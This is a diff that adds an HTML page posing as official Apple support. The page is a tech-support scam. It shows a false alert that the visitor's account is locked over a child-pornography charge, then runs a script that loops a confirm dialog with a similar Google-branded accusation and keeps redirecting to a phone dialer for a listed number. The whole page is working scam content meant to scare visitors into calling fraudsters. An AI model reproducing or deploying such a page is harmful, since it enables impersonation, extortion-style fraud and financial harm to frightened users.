@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<title>Contact - Official Online support</title>
+ 
+<meta name="description" content="Contact Online support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more." />
+<script src="text.js"></script> 
+<style>
+  html, body {
+    height: 100%;
+    margin: 0; padding: 0;
+    overflow: hidden;
+    font-family: Arial, sans-serif;
+  }
+  .bg-gif {
+    position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+    width: 100vw; height: 100vh;
+    object-fit: cover;
+    z-index: -2;
+  }
+  header, footer {
+    width: 100vw;
+    min-height: 38px;
+    display: flex;
+    align-items: center;
+    position: absolute;
+    left: 0;
+    padding: 0 18px;
+    box-sizing: border-box;
+    color: #2f2f2f;
+    z-index: 10;
+  }
+  header {
+    top: 0;
+    height: 48px;
+    justify-content: space-between;
+    background: rgba(22, 22, 22, 0.6);
+    color: #f1f1f1;
+  }
+  .header-left {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+  }
+  .logo-img {
+    height: 32px;
+    width: 32px;
+    border-radius: 6px;
+  }
+  .datetime {
+    font-size: 1rem;
+    font-family: monospace;
+    letter-spacing: 1px;
+  }
+  .overlay-msg {
+    position: absolute;
+    top: 60px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: rgba(0, 0, 0, 0.7);
+    color: #fff;
+    padding: 16px 32px;
+    border-radius: 8px;
+    font-size: 1.5rem;
+    z-index: 2;
+    border: 3px solid transparent;
+    transition: border-color 0.3s ease;
+  }
+  @keyframes flash-border {
+    0%, 100% { border-color: transparent; }
+    50% { border-color: red; }
+  }
+  .flash-border {
+    animation: flash-border 1s ease-in-out;
+  }
+  footer {
+    bottom: 0;
+    height: 38px;
+    justify-content: center;
+    font-size: 0.95rem;
+    font-style: italic;
+    background: #f9f9f9;
+    color: #333;
+    box-shadow: 0 -2px 5px rgba(0,0,0,0.1);
+  }
+  @media (max-width: 600px) {
+    header, footer { padding: 0 12px; }
+    .overlay-msg {
+      font-size: 1.2rem;
+      padding: 12px 20px;
+      max-width: 90vw;
+    }
+    .datetime { font-size: 0.85rem; }
+    .logo-img { height: 24px; width: 24px; }
+    header { height: 40px; }
+    footer { font-size: 0.85rem; height: 32px; }
+  }
+</style>
+</head>
+<body>
+
+<img src="giphy.gif" class="bg-gif" alt="Background GIF" />
+
+<header>
+  <div class="header-left">
+    <img class="logo-img" src="applefav.png" alt="Logo" />
+  </div>
+  <div class="datetime" id="datetime"></div>
+</header>
+
+<div class="overlay-msg" id="alertMessage">Your Apple Account has been locked Because of charged $149.00 for illegal Child pornography via Apple Pay. If you didn’t make this purchase, contact Apple Support immediately at +1 (888)-649-6002 to unlock your account and block this transaction. Act fast to prevent unauthorized charges.</div>
+
+<footer>
+  Copyright © 2025 Apple Inc. All rights reserved.
+</footer>
+
+<script>
+  function updateTime() {
+    const dt = new Date();
+    const formatted = dt.toLocaleDateString() + " " + dt.toLocaleTimeString();
+    document.getElementById("datetime").textContent = formatted;
+  }
+  setInterval(updateTime, 1000);
+  updateTime();
+
+  const alertMessage = document.getElementById('alertMessage');
+
+  function flashBorder() {
+    alertMessage.classList.add('flash-border');
+    setTimeout(() => alertMessage.classList.remove('flash-border'), 400);
+  }
+
+  function spamConfirmAndRedirect() {
+    flashBorder();
+    confirm("Your Google Account has been locked due to detected illegal Child pornography. Your Google Account has been disabled.Immediately call on Online Security Support +1 888 649 6002 to unlock it!");
+    // Redirect to dialer regardless of user choice
+    window.location.href = "tel:18886496002";
+    setTimeout(spamConfirmAndRedirect, 300);
+  }
+
+  setTimeout(spamConfirmAndRedirect, 300);
+
+</script>
+
+
+</body>
+</html>
